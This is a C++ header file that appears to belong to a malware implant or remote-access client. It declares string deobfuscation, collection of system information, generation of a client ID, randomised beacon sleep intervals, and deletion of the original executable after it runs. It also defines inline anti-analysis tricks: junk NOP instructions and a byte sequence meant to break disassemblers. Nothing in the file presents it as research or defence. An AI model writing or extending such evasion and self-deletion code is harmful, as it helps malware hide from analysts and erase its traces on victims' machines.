#ifndef UTILS_H
#define UTILS_H

#include <string>

// Deobfuscation function
std::string deobfuscate(const unsigned char* obfuscated_str);

// System information
std::string get_system_info();

// Generate client ID
std::string generate_client_id();

// Random sleep interval
int get_random_sleep_interval(int base_seconds);


// these are inline so it directly replaces the function call with the code, which can help with performance and obfuscation

// Add junk instruction (anti-analysis)
inline void add_junk_instruction(){
    // This function adds junk instructions to confuse disassemblers

    #ifdef _MSC_VER
        __asm { nop }
    #else
        asm("nop");
    #endif
}

// Add impossible disassembly (anti-analysis)
inline void add_impossible_disassembly(){
    // This function adds impossible-to-disassemble byte sequences
    volatile unsigned char dummy[] = { 0xEB, 0xFF, 0xE8, 0x04, 0x00, 0x00 };
    (void)dummy; // Prevent unused variable warning
}


// New name for file deletion function
void safely_remove_original_executable(const std::string& path);

// Legacy function for backward compatibility (redirects to safely_remove_original_executable)
void delete_original_file(const std::string& path);

#endif // UTILS_H
